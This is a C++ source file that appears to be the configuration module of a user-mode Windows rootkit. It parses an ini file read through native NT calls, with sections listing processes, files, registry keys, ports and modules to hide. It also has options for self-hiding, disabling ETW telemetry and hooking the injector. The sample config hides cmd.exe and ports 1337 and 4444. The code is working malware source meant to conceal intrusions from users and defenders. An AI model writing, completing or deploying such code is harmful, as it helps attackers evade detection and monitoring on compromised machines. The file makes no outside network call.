/*
 * config.cpp - ini parser + wildcard matcher + hot-reload watcher
 *
 * Intentionally tiny: GetPrivateProfileIntW/GetPrivateProfileStringW are
 * not used because we cannot rely on kernel32 being reachable pre-hook;
 * instead the file is read with NtCreateFile and parsed manually. The
 * format is the classic ini:
 *
 *     [HideProcess]
 *     cmd.exe
 *     explorer*
 *
 *     [HidePort]
 *     1337
 *     4444
 */

#include "config.h"
#include "rknt.h"

#include <stdio.h>
#include <wchar.h>
#include <wctype.h>
#include <string.h>

/* ------------------------------------------------------------------ */
/* State                                                              */
/* ------------------------------------------------------------------ */

static SRWLOCK      s_lock      = SRWLOCK_INIT;
static rk_config    s_cfg;
static long long    s_last_write = 0;

/* ------------------------------------------------------------------ */
/* Wildcard matcher: supports * and ?, case-insensitive               */
/* ------------------------------------------------------------------ */

static int wcsw_impl(const wchar_t *pat, const wchar_t *str)
{
    while (*pat && *str)
    {
        if (*pat == L'*')
        {
            ++pat;
            if (!*pat) return 1; /* trailing * matches everything */
            while (*str)
            {
                if (wcsw_impl(pat, str)) return 1;
                ++str;
            }
            return 0;
        }
        if (*pat != L'?' &&
            towlower(*pat) != towlower(*str))
            return 0;
        ++pat; ++str;
    }
    while (*pat == L'*') ++pat;
    return (!*pat && !*str);
}

extern "C" int rk_wcsw(const wchar_t *pattern, const wchar_t *str)
{
    if (!pattern || !str) return 0;
    return wcsw_impl(pattern, str);
}

/* ------------------------------------------------------------------ */
/* File reading                                                       */
/* ------------------------------------------------------------------ */

typedef NTSTATUS (NTAPI *pNtCreateFile_t)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK,
    PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);
typedef NTSTATUS (NTAPI *pNtReadFile_t)(
    HANDLE, HANDLE, PVOID, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG,
    PLARGE_INTEGER, PULONG);

static void *nt_resolve(const char *name)
{
    HMODULE nt = GetModuleHandleA("ntdll.dll");
    return (void *)GetProcAddress(nt, name);
}

/* Read the whole file into a caller-provided buffer. Returns size or 0. */
static unsigned long rk_read_file(const wchar_t *path,
                                  unsigned char *buf, unsigned long cap)
{
    static pNtCreateFile_t NtCreateFile;
    static pNtReadFile_t   NtReadFile;
    if (!NtCreateFile)
    {
        NtCreateFile = (pNtCreateFile_t)nt_resolve("NtCreateFile");
        NtReadFile   = (pNtReadFile_t)nt_resolve("NtReadFile");
        if (!NtCreateFile || !NtReadFile) return 0;
    }

    UNICODE_STRING us;
    OBJECT_ATTRIBUTES oa;
    IO_STATUS_BLOCK iosb;
    wchar_t nt_path[MAX_PATH * 2];
    HANDLE  h = NULL;
    NTSTATUS st;

    /* Win32 path -> NT path (\??\C:\...) */
    _snwprintf(nt_path, MAX_PATH * 2 - 1, L"\\??\\%s", path);
    us.Buffer        = nt_path;
    us.Length        = (USHORT)(wcslen(nt_path) * sizeof(wchar_t));
    us.MaximumLength = sizeof(nt_path);

    InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE, NULL, NULL);

    st = NtCreateFile(&h, FILE_GENERIC_READ, &oa, &iosb, NULL,
                      FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_WRITE,
                      FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
    if (!NT_SUCCESS(st) || !h)
        return 0;

    unsigned long total = 0;
    for (;;)
    {
        if (total >= cap) break;
        st = NtReadFile(h, NULL, NULL, NULL, &iosb, buf + total,
                        cap - total, NULL, NULL);
        if (!NT_SUCCESS(st)) break;
        total += (unsigned long)iosb.Information;
    }
    NtClose(h);
    return total;
}

/* ------------------------------------------------------------------ */
/* Parsing                                                            */
/* ------------------------------------------------------------------ */

static void trim(wchar_t *s)
{
    wchar_t *p = s;
    while (*p == L' ' || *p == L'\t') ++p;
    if (p != s) memmove(s, p, (wcslen(p) + 1) * sizeof(wchar_t));
    size_t n = wcslen(s);
    while (n && (s[n - 1] == L' ' || s[n - 1] == L'\t' ||
                 s[n - 1] == L'\r' || s[n - 1] == L'\n'))
        s[--n] = 0;
}

static void add_entry(rk_config *cfg, int section, const wchar_t *value)
{
    wchar_t tmp[RK_MAX_NAME];
    if (!value || !*value) return;
    _snwprintf(tmp, RK_MAX_NAME - 1, L"%s", value);
    trim(tmp);
    if (!tmp[0]) return;

    switch (section)
    {
    case 0: /* HideProcess */
        if (cfg->process_count < RK_MAX_ITEMS)
            _snwprintf(cfg->processes[cfg->process_count++],
                       RK_MAX_NAME - 1, L"%s", tmp);
        break;
    case 1: /* HideFile */
        if (cfg->file_count < RK_MAX_ITEMS)
            _snwprintf(cfg->files[cfg->file_count++],
                       RK_MAX_NAME - 1, L"%s", tmp);
        break;
    case 2: /* HideRegistry */
        if (cfg->registry_count < RK_MAX_ITEMS)
            _snwprintf(cfg->registry[cfg->registry_count++],
                       RK_MAX_NAME - 1, L"%s", tmp);
        break;
    case 3: /* HidePort */
        if (cfg->port_count < RK_MAX_ITEMS)
            cfg->ports[cfg->port_count++] =
                (uint16_t)_wtoi(tmp);
        break;
    case 4: /* HideModule */
        if (cfg->module_count < RK_MAX_ITEMS)
            _snwprintf(cfg->modules[cfg->module_count++],
                       RK_MAX_NAME - 1, L"%s", tmp);
        break;
    default:
        break;
    }
}

static void parse_buffer(rk_config *cfg, const unsigned char *buf,
                         unsigned long len)
{
    /* The file is expected to be UTF-16LE (written by the injector); if we
     * detect a BOM, parse wide, otherwise fall back to ANSI conversion. */
    int section = -1;

    if (len >= 2 && buf[0] == 0xFF && buf[1] == 0xFE)
    {
        const wchar_t *w  = (const wchar_t *)(buf + 2);
        unsigned long wn  = (len - 2) / 2;
        wchar_t line[RK_MAX_NAME * 2];
        unsigned long i = 0;

        while (i < wn)
        {
            unsigned long j = 0;
            while (i < wn && w[i] != L'\n' && j < RK_MAX_NAME * 2 - 1)
                line[j++] = w[i++];
            line[j] = 0;
            if (i < wn && w[i] == L'\n') ++i;

            trim(line);
            if (!line[0] || line[0] == L';' || line[0] == L'#')
                continue;

            if (line[0] == L'[')
            {
                wchar_t *close = wcschr(line, L']');
                if (!close) continue;
                *close = 0;
                wchar_t *name = line + 1;
                trim(name);
                if      (!_wcsicmp(name, L"HideProcess"))  section = 0;
                else if (!_wcsicmp(name, L"HideFile"))     section = 1;
                else if (!_wcsicmp(name, L"HideRegistry")) section = 2;
                else if (!_wcsicmp(name, L"HidePort"))     section = 3;
                else if (!_wcsicmp(name, L"HideModule"))   section = 4;
                else if (!_wcsicmp(name, L"Advanced"))     section = 5;
                else    section = -1;
                continue;
            }

            if (section >= 0 && section <= 4)
                add_entry(cfg, section, line);
            else if (section == 5)
            {
                /* Advanced: key=value */
                wchar_t *eq = wcschr(line, L'=');
                if (!eq) continue;
                *eq = 0;
                wchar_t *key = line; wchar_t *val = eq + 1;
                trim(key); trim(val);
                if (!_wcsicmp(key, L"SelfHide"))     cfg->self_hide     = _wtoi(val);
                if (!_wcsicmp(key, L"DisableEtw"))   cfg->disable_etw   = _wtoi(val);
                if (!_wcsicmp(key, L"HookInjector")) cfg->hook_injector = _wtoi(val);
            }
        }
        return;
    }

    /* ASCII fallback: convert to UTF-16LE with BOM, re-enter parser. */
    static unsigned char view[16384];
    wchar_t wide[8192];
    unsigned long n = 0;
    for (unsigned long i = 0; i < len && n < 8191; ++i)
        wide[n++] = (wchar_t)buf[i];
    view[0] = 0xFF; view[1] = 0xFE;
    memcpy(view + 2, wide, (size_t)n * sizeof(wchar_t));
    parse_buffer(cfg, view, n * sizeof(wchar_t) + 2);
}

extern "C" int rk_config_load(rk_config *cfg)
{
    static unsigned char buf[16384];
    wchar_t path[MAX_PATH * 2];
    unsigned long len;
    WIN32_FILE_ATTRIBUTE_DATA fad;
    long long ft;

    rk_config_path(path, MAX_PATH * 2);

    len = rk_read_file(path, buf, sizeof(buf));
    if (!len)
        return 1;

    if (GetFileAttributesExW(path, GetFileExInfoStandard, &fad))
    {
        ft = ((long long)fad.ftLastWriteTime.dwHighDateTime << 32) |
              (long long)fad.ftLastWriteTime.dwLowDateTime;
    }
    else
        ft = 0;

    AcquireSRWLockExclusive(&s_lock);

    ZeroMemory(cfg, sizeof(*cfg));
    cfg->self_hide     = 1;
    cfg->disable_etw   = 0;
    cfg->hook_injector = 0;

    parse_buffer(cfg, buf, len);
    s_last_write = ft;
    memcpy(&s_cfg, cfg, sizeof(*cfg));

    ReleaseSRWLockExclusive(&s_lock);
    return 0;
}

extern "C" void rk_config_snapshot(rk_config *dst)
{
    AcquireSRWLockShared(&s_lock);
    memcpy(dst, &s_cfg, sizeof(*dst));
    ReleaseSRWLockShared(&s_lock);
}

/* Returns 1 if the file changed since the last load. */
extern "C" int rk_config_changed(void)
{
    wchar_t path[MAX_PATH * 2];
    WIN32_FILE_ATTRIBUTE_DATA fad;
    long long ft;

    rk_config_path(path, MAX_PATH * 2);
    if (!GetFileAttributesExW(path, GetFileExInfoStandard, &fad))
        return 0;

    ft = ((long long)fad.ftLastWriteTime.dwHighDateTime << 32) |
          (long long)fad.ftLastWriteTime.dwLowDateTime;
    return ft != s_last_write;
}

extern "C" void rk_config_path(wchar_t *out, int out_len)
{
    /* Default: rk.ini next to the DLL. The injector may set a per-machine
     * override under HKLM\SOFTWARE\Rk\RkConfigPath. */
    wchar_t tmp[1024] = {0};
    DWORD   type = 0, size = sizeof(tmp);
    LSTATUS r = RegGetValueA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Rk",
                             "RkConfigPath", RRF_RT_REG_SZ, &type,
                             tmp, &size);
    if (r == ERROR_SUCCESS && tmp[0])
    {
        _snwprintf(out, out_len - 1, L"%s", tmp);
        return;
    }

    HMODULE self = NULL;
    GetModuleHandleExA(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS |
                       GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
                       (LPCSTR)&rk_config_path, &self);
    GetModuleFileNameW(self, out, out_len - 1);
    wchar_t *slash = wcsrchr(out, L'\\');
    if (slash) *(slash + 1) = 0;
    wcscat(out, L"rk.ini");
}